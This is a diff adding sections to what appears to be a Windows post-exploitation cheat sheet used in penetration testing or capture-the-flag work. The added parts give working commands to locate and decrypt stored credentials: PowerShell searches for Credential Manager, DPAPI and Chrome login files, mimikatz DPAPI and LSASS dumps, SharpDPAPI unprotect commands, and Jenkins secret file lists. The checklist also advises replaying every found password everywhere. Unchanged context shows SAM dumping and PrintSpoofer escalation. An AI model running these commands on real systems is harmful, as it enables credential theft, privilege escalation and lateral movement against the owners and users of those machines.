@@ -44,6 +44,18 @@ Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx,*.exe,*.zip
 Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql -Recurse -ErrorAction SilentlyContinue
 ```
 
+## Loot triage checklist
+```text
+Pull and review first:
+- .env, web.config, unattend, sysprep, export, backup, zip, bak
+- scripts, scheduled task actions, service configs, installer leftovers
+- Jenkins home, job workspaces, build history, users, secrets
+- browser data, PSReadLine, cmdkey, Credential Manager, DPAPI blobs
+- database files, connection strings, saved RDP files
+
+Every recovered password or hash gets replayed everywhere before you go hunting for a new bug.
+```
+
 ## Find PSReadLine history
 ```powershell
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
@@ -53,6 +65,14 @@ Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSRe
 ```cmd
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 cmdkey /list
+```
+
+## Find Credential Manager and DPAPI artifacts
+```powershell
+Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Protect -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login* -Force -ErrorAction SilentlyContinue
 ```
 
 ## Check VNC creds in registry
@@ -70,6 +90,18 @@ reg query HKLM\SOFTWARE\TightVNC\Server
 ```cmd
 .\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
+```
+
+## Triage DPAPI credential blobs
+```cmd
+.\mimikatz.exe "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>" "exit"
+.\mimikatz.exe "sekurlsa::dpapi" "exit"
+```
+
+## Dump browser and Credential Manager secrets with SharpDPAPI
+```cmd
+SharpDPAPI.exe credentials /unprotect
+SharpDPAPI.exe browser /unprotect
 ```
 
 ## List services with paths
@@ -162,6 +194,23 @@ robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
 .\PrintSpoofer64.exe -i -c "cmd"
 ```
 
+## Quick Jenkins triage
+```powershell
+Get-ChildItem -Path C:\Users\*\AppData\Local\Jenkins\.jenkins -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ProgramData\Jenkins -Recurse -ErrorAction SilentlyContinue
+```
+
+## Jenkins files worth pulling
+```text
+- users\*\config.xml
+- credentials.xml
+- secrets\
+- jobs\*\config.xml
+- jobs\*\builds\
+- workspace\
+- nodes\
+```
+
 ## Shell delivery and file transfer
 ```text
 Use [[Shell Delivery and Transfer]].
@@ -173,6 +222,9 @@ Do this before pivoting:
 - read Mimikatz output fully
 - read all PSReadLine history
 - search for unusual files, db files, configs, saved creds
+- crack archives and inspect the contents, not just the filenames
+- if a service is localhost-only, expose it now
+- pull Credential Manager / DPAPI artifacts while you still have context
 - check ipconfig /all, netstat -ano, arp -a
 - if domain joined, rerun AD enumeration from this host
 - test every found password/hash everywhere
